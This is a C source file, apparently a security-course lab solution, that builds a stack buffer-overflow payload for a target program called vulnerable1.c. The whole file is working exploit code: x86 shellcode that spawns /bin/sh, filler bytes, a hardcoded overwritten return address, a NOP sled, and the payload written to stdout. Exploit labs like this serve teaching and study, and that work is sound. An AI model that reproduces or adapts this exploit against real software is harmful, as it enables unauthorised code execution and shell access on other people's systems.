/* exploit1.c  */
/* Outputs a string for code injection on vulnerable1.c */

#include <stdio.h>
#include <string.h>

#define BUFFER_SIZE 512

char shellcode[]=
  "\x31\xc0"             /* xorl    %eax,%eax         */
  "\x50"                 /* pushl   %eax              */
  "\x68""//sh"           /* pushl   $0x68732f2f       */
  "\x68""/bin"           /* pushl   $0x6e69622f       */
  "\x89\xe3"             /* movl    %esp,%ebx         */
  "\x50"                 /* pushl   %eax              */
  "\x53"                 /* pushl   %ebx              */
  "\x89\xe1"             /* movl    %esp,%ecx         */
  "\x99"                 /* cdql                      */
  "\xb0\x0b"             /* movb    $0x0b,%al         */
  "\xcd\x80"             /* int     $0x80             */
;

int main()
{
    char buffer[BUFFER_SIZE];

    /* Initialize the buffer to all zeroes */
    memset(buffer, 0x0, BUFFER_SIZE);

    /* TODO: Fill the buffer with appropriate contents */
    for (int i =0; i< 36 ;i++){
      buffer[i] = 0x88;
    }
    buffer[39] = 0xff;
    buffer[38] = 0xff;
    buffer[37] = 0xdc;
    buffer[36] = 0x2c;

    for(int i =40;i<488;i++){
      buffer[i] = 0x90;
    }
    //strcat(buffer+488,shellcode);
    memcpy(buffer+488,shellcode,strlen(shellcode)+1);
    /* Print out the contents of the attack buffer */
    fwrite(buffer, BUFFER_SIZE, 1, stdout);
    return 0;
}